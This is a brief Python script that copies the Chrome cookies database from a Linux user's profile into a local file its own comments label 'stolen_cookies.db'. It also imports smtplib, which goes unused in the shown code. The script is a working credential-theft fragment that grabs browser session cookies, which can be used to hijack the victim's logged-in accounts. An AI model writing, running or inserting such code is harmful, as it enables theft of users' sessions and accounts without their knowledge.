import smtplib
import shutil
import os

# Path to the Chrome cookies file
cookie_path = os.path.expanduser('~/.config/google-chrome/Default/Cookies')

# Destination path to save the stolen cookies
destination_path = 'stolen_cookies.db'

# Copy the cookies file to the destination path
shutil.copy(cookie_path, destination_path)